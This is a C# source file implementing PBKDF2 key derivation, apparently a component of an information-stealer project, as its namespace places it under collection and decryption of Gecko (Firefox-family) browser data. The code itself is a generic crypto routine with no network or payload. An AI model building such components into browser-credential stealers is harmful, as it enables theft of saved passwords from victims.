using System;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics.CodeAnalysis;

namespace IndieStealer.Collect.Browsers.Gecko.Decrypt
{
                                                public class Pbkdf2
    {

                                                                        public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations)
        {
            if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
            if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
            if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
            this.Algorithm = algorithm;
            this.Algorithm.Key = password;
            this.Salt = salt;
            this.IterationCount = iterations;
            this.BlockSize = this.Algorithm.HashSize / 8;
            this.BufferBytes = new byte[this.BlockSize];
        }

                                                                public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt)
            : this(algorithm, password, salt, 1000)
        {
        }

                                                                        public Pbkdf2(HMAC algorithm, String password, String salt, Int32 iterations) :
            this(algorithm, UTF8Encoding.UTF8.GetBytes(password), UTF8Encoding.UTF8.GetBytes(salt), iterations)
        {
        }

                                                                public Pbkdf2(HMAC algorithm, String password, String salt) :
            this(algorithm, password, salt, 1000)
        {
        }


        private readonly int BlockSize;
        private uint BlockIndex = 1;

        private byte[] BufferBytes;
        private int BufferStartIndex = 0;
        private int BufferEndIndex = 0;


                                public HMAC Algorithm { get; private set; }

                                public Byte[] Salt { get; private set; }

                                public Int32 IterationCount { get; private set; }


                                                public Byte[] GetBytes(int count)
        {
            byte[] result = new byte[count];
            int resultOffset = 0;
            int bufferCount = this.BufferEndIndex - this.BufferStartIndex;

            if (bufferCount > 0)
            {                 if (count < bufferCount)
                {                     Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
                    this.BufferStartIndex += count;
                    return result;
                }
                Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
                this.BufferStartIndex = this.BufferEndIndex = 0;
                resultOffset += bufferCount;
            }

            while (resultOffset < count)
            {
                int needCount = count - resultOffset;
                this.BufferBytes = this.Func();
                if (needCount > this.BlockSize)
                {                     Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
                    resultOffset += this.BlockSize;
                }
                else
                {
                    Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
                    this.BufferStartIndex = needCount;
                    this.BufferEndIndex = this.BlockSize;
                    return result;
                }
            }
            return result;
        }


        private byte[] Func()
        {
            var hash1Input = new byte[this.Salt.Length + 4];
            Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
            Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
            var hash1 = this.Algorithm.ComputeHash(hash1Input);

            byte[] finalHash = hash1;
            for (int i = 2; i <= this.IterationCount; i++)
            {
                hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
                for (int j = 0; j < this.BlockSize; j++)
                {
                    finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
                }
            }
            if (this.BlockIndex == uint.MaxValue) { throw new InvalidOperationException("Derived key too long."); }
            this.BlockIndex += 1;

            return finalHash;
        }

        private static byte[] GetBytesFromInt(uint i)
        {
            var bytes = BitConverter.GetBytes(i);
            if (BitConverter.IsLittleEndian)
            {
                return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
            }
            else
            {
                return bytes;
            }
        }

    }
}
